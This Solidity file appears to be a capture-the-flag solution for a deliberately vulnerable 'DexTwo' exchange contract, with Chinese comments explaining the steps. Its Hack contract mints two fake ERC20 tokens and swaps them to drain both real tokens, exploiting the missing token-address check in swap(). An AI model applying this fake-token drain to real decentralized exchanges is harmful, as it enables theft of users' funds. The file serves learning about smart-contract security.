// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
contract Hack {
    constructor(IDex dex) {//再次复习一下，这个地方传入了dex的地址，使得能够获取token1和2的地址方便后面的操作
        IERC20 token1 =IERC20(dex.token1());//这个地方传入目标token的地址
        IERC20 token2 =IERC20(dex.token2());

        MyToken mytoken1 =new MyToken(100);//这边使得创建了两个假token的地址赋到内部
        MyToken mytoken2 =new MyToken(100);//这个地方最终在括号内完成了发币的总量实际上应该使用mint函数
        //在 ERC-20 标准中，mint 函数通常用于创建（铸造）新的代币并将其分配给指定的地址。
        //这个函数通常由代币的创建者（合约的管理员）调用。
        //mint 函数的主要参数通常包括要接收新代币的地址以及要铸造的代币数量。这样，合约的管理员可以随时增加代币的总供应量，而不是在合约部署时就固定了总供应量。
        mytoken1.transfer(address(dex),1);
        mytoken2.transfer(address(dex),1);//这边执行攻击的第一步，先给目标合约一个币
        //这边再使用第二步，调用swap函数来交换,在这之前要先给他权限
        mytoken1.approve(address(dex),1);
        mytoken2.approve(address(dex),1);
        dex.swap(address(mytoken1),address(token1),1);
        dex.swap(address(mytoken2),address(token2),1);

    }
    
}
interface IDex {
    function token1() external view returns (address);
    function token2() external view returns (address);
    function swap(address from, address to, uint amount) external;
    
}
    interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address to, uint256 value) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 value) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    function transferFrom(address from, address to, uint256 value) external returns (bool);
}    

contract MyToken is IERC20 {
    string public name = "MyToken";
    string public symbol = "MTK";
    uint8 public decimals = 18;

    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    uint256 private _totalSupply;

    constructor(uint256 initialSupply) {
        _totalSupply = initialSupply * (10**uint256(decimals));
        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address to, uint256 value) public override returns (bool) {
        require(to != address(0), "ERC20: transfer to the zero address");
        require(_balances[msg.sender] >= value, "ERC20: insufficient balance");

        _balances[msg.sender] -= value;
        _balances[to] += value;

        emit Transfer(msg.sender, to, value);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 value) public override returns (bool) {
        _allowances[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true;
    }

    function transferFrom(address from, address to, uint256 value) public override returns (bool) {
        require(to != address(0), "ERC20: transfer to the zero address");
        require(_balances[from] >= value, "ERC20: insufficient balance");
        require(_allowances[from][msg.sender] >= value, "ERC20: insufficient allowance");

        _balances[from] -= value;
        _balances[to] += value;
        _allowances[from][msg.sender] -= value;

        emit Transfer(from, to, value);
        return true;
    }
}

/*import "openzeppelin-contracts-08/token/ERC20/IERC20.sol";
import "openzeppelin-contracts-08/token/ERC20/ERC20.sol";
import 'openzeppelin-contracts-08/access/Ownable.sol';

contract DexTwo is Ownable {
  address public token1;
  address public token2;
  constructor() {}

  function setTokens(address _token1, address _token2) public onlyOwner {
    token1 = _token1;
    token2 = _token2;
  }

  function add_liquidity(address token_address, uint amount) public onlyOwner {
    IERC20(token_address).transferFrom(msg.sender, address(this), amount);
  }
  //攻击思路为，这个地方没有使用检查这两个传入的地址是不是token1或者token2，所以我们可以使用一些虚假的token来说换
  例如我可以使用假token1投入1个，然后再投入一个的过程当中去换，这样就把所有的token2换出来了，换出来所有的token2的原理也一样

  function swap(address from, address to, uint amount) public {
    require(IERC20(from).balanceOf(msg.sender) >= amount, "Not enough to swap");
    uint swapAmount = getSwapAmount(from, to, amount);
    IERC20(from).transferFrom(msg.sender, address(this), amount);
    IERC20(to).approve(address(this), swapAmount);
    IERC20(to).transferFrom(address(this), msg.sender, swapAmount);
  } 

  function getSwapAmount(address from, address to, uint amount) public view returns(uint){
    return((amount * IERC20(to).balanceOf(address(this)))/IERC20(from).balanceOf(address(this)));
  }

  function approve(address spender, uint amount) public {
    SwappableTokenTwo(token1).approve(msg.sender, spender, amount);
    SwappableTokenTwo(token2).approve(msg.sender, spender, amount);
  }

  function balanceOf(address token, address account) public view returns (uint){
    return IERC20(token).balanceOf(account);
  }
}

contract SwappableTokenTwo is ERC20 {
  address private _dex;
  constructor(address dexInstance, string memory name, string memory symbol, uint initialSupply) ERC20(name, symbol) {
        _mint(msg.sender, initialSupply);
        _dex = dexInstance;
  }

  function approve(address owner, address spender, uint256 amount) public {
    require(owner != _dex, "InvalidApprover");
    super._approve(owner, spender, amount);
  }
}*/